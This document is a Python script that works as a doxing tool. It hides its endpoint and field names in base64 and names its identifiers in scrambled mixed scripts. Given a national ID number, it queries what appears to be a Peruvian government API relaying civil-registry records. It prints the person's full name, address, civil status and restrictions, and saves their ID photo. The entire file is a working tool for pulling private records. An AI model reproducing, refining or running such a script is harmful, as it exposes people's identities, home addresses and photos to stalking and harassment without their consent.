import base64
import requests
import random
import json
import colorama
from colorama import Fore,init
init()

נֶטוֹ = Fore.RED
ירוק = Fore.GREEN
טורקיז = Fore.CYAN
לבן = Fore.WHITE
כָּחוֹל = Fore.BLUE

def شعار():
    باننركود = "CuKVpuKVlOKVkOKUrOKUgOKUkOKUrCDilKzilIzilIDilJDilIzilKzilJDilKwg4pSsCuKVoOKVqeKVl+KUnOKUrOKUmOKUgiDilILilJTilIDilJAg4pSCIOKUlOKUrOKUmArilakg4pWp4pS04pSU4pSA4pSU4pSA4pSY4pSU4pSA4pSYIOKUtCAg4pS0IApNT05LRVktSEs0IDIwMjIKSW5zdGFncmFtOiBkNHZpZC4wZGF5"
    الخطوةالاولى = باننركود.encode('utf-8')
    خطوات = base64.b64decode(الخطوةالاولى)
    #print(خطوات) metodo
    الصور = خطوات.decode('utf-8')
    نص = الصور
    كولورون = ['LIGHTCYAN_EX', 'BLUE']
    رموز = vars(colorama.Fore)
    اللون = [رموز[color] for color in رموز if color in كولورون]
    لوحة = [random.choice(اللون) + char for char in نص]
    print(''.join(لوحة))

لينكون = 'aHR0cHM6Ly9hcGkubXVuaWNhbGxhby5nb2IucGUv'
القواعد = لينكون.encode('ascii')
رسائل = base64.b64decode(القواعد)
هوستورل = رسائل.decode('ascii')

لينكدوس = 'cGlkZS9wdWJsaWMvdjEvcmVuaWVjL2RuaS9idXNjYXI='
ترميز =  لينكدوس.encode('ascii')
أساس = base64.b64decode(ترميز)
سلسلة = أساس.decode('ascii')

فوللينك = f"{هوستورل}{سلسلة}"
تبوك = فوللينك

#заголовки
def دوكسينج():
    ડીએનઆઇ = input("\nESCRIBE EL NÚMERO DE DNI A BUSCAR: ")
    સંદેશ_બાઇટ્સ = ડીએનઆઇ.encode('ascii')
    બેઝબાઇટ્સ = base64.b64encode(સંદેશ_બાઇટ્સ)
    સંદેશ = બેઝબાઇટ્સ.decode('ascii')
    # dni codificado
    ضبط = "dXN1YXJpbw=="
    تطبيق = "YXBw"
    مضيف = "aXA="
    جيسون = "ZG5p"
    جايسون = "c3RyTnVtRG9jdW1lbnRv"
    
    dec1 = ضبط.encode('ascii')
    decc = base64.b64decode(dec1)
    ديسمبر = decc.decode('ascii')

    dic2 = تطبيق.encode('ascii')
    dicc = base64.b64decode(dic2)
    عشاري = dicc.decode('ascii')

    dac3 = مضيف.encode('ascii')
    dacc = base64.b64decode(dac3)
    كشف = dacc.decode('ascii')

    कोड1 = جيسون.encode('ascii')
    ज़ाब्ता = base64.b64decode(कोड1)
    المشفرة = ज़ाब्ता.decode('ascii')
    
    डीकोड = સંદેશ.encode('ascii')
    विकोडक = base64.b64decode(डीकोड)
    الشفرات = विकोडक.decode('ascii')

    डिकोडर = جايسون.encode('ascii')
    डिकोडर3 = base64.b64decode(डिकोडर)
    ثلاثة = डिकोडर3.decode('ascii')

    n1 = ديسمبر
    n2 = عشاري
    n3 = كشف
    h4 = الشفرات
    n4 = المشفرة
    n5 = ثلاثة
    h1 = 0
    h2 = 33
    h3 = "0.0.0.0"
    h5 = "null"

    بيانات = {
        n1 :h1,
        n2 :h2,
        n3 :h3,
        n4 :h4,
        n5 :h5
    }
   
    التماس = requests.post(تبوك, json=بيانات)
    تيكسوناسي = التماس.json()
    اسم = تيكسوناسي['consultarResponse']['return']['datosPersona']['prenombres']
    الأب = تيكسوناسي['consultarResponse']['return']['datosPersona']['apPrimer']
    ماتيرو =  تيكسوناسي['consultarResponse']['return']['datosPersona']['apSegundo']
    الجغرافي = تيكسوناسي['consultarResponse']['return']['datosPersona']['ubigeo']
    حالة =  تيكسوناسي['consultarResponse']['return']['datosPersona']['estadoCivil']
    منزل = تيكسوناسي['consultarResponse']['return']['datosPersona']['direccion']
    تقييد =  تيكسوناسي['consultarResponse']['return']['datosPersona']['restriccion']
    التصوير = تيكسوناسي['consultarResponse']['return']['datosPersona']['foto']
    فك = open(f'imagen.jpg', 'wb')
    فك.write(base64.b64decode((التصوير)))
    فك.close()
    # طباعة البيانات التي تم جلبها في json
    print(f"""
 {ירוק}NOMBRE => {לבן}{اسم}
 {ירוק}APELLIDO PATERNO => {לבן}{الأب}
 {ירוק}APELLIDO MATERNO => {לבן}{ماتيرو}
 {ירוק}UBIGEO => {לבן}{الجغرافي}
 {ירוק}DIRECCIÓN => {לבן}{منزل}
 {ירוק}ESTADO CIVL => {לבן}{حالة}
 {ירוק}RESTRICCIONES => {לבן}{تقييد}
    """)

if __name__ == "__main__":
    شعار()
    دوكسينج()